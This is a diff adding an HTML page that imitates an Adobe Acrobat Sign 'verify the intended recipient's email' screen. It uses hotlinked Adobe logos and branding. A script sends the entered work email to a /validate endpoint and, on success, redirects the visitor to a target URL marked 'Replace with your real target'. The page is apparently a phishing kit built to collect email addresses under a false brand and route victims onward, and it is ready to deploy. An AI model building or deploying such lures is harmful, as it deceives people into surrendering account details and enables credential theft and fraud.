@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Before we continue...</title>
+    <link rel="icon" href="data:image/png;base64,...">
+    <link rel="stylesheet" href="style.css">
+  </head>
+  <body>
+    <div id="app" data-v-app="">
+      <div class="background">
+        <div class="adobe-sign-container">
+          <div class="sign-card">
+            <div class="header">
+              <div class="logo-text">
+                <span class="person-icon">⼈</span> Adobe Acrobat Sign 
+              </div>
+              <img class="adobe-logo" src="https://na4.documents.adobe.com/images/emailNextGen/email-adobe-tag-classic@2x.png" alt="Adobe Logo">
+            </div>
+            <div class="success-check">✓</div>
+            <div class="content">
+              <p><strong>Verify the intended recipient's email.</strong></p>
+              <p>Enter the email address to which this item was shared to sign your document.</p>
+              <input id="emailInput" type="email" placeholder="Enter email" required>
+              <p id="errorMsg" class="error" style="display:none;color:red;">Please enter a valid work email address.</p>
+            </div>
+            <button id="verifyBtn">OPEN</button>
+            <div class="divider"></div>
+            <p class="footer-text"> Attached is the final agreement for your reference. Read it with <a href="#">Acrobat Reader</a>. You can also <a href="#">open it online</a> to review its activity history. </p>
+          </div>
+          <div class="global-footer">
+            <p><strong>Powered by</strong></p>
+            <img class="footer-logo" src="https://na4.documents.adobe.com/images/emailNextGen/email-adobe-sign-logo.3@2x.png" alt="Adobe Sign Logo">
+            <p>Need your own documents signed? Adobe Acrobat Sign can help save you time. <a href="#">Learn more</a>.</p>
+            <p>To ensure that you continue receiving our emails, please add adobesign@adobesign.com to your address book.</p>
+            <p>Terms of Use | Report Abuse</p>
+            <p>© 2025 Adobe. All rights reserved.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      const verifyBtn = document.getElementById("verifyBtn");
+      const emailInput = document.getElementById("emailInput");
+      const errorMsg = document.getElementById("errorMsg");
+      const redirectURL = "https://example.com/signed-document"; // Replace with your real target
+
+      verifyBtn.addEventListener("click", () => {
+        const email = emailInput.value.trim().toLowerCase();
+
+        fetch("/validate", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ email })
+        })
+        .then(res => {
+          if (!res.ok) throw new Error();
+          return res.json();
+        })
+        .then(data => {
+          if (data.success) {
+            window.location.href = redirectURL;
+          } else {
+            throw new Error();
+          }
+        })
+        .catch(() => {
+          errorMsg.style.display = "block";
+        });
+      });
+    </script>
+  </body>
+</html>
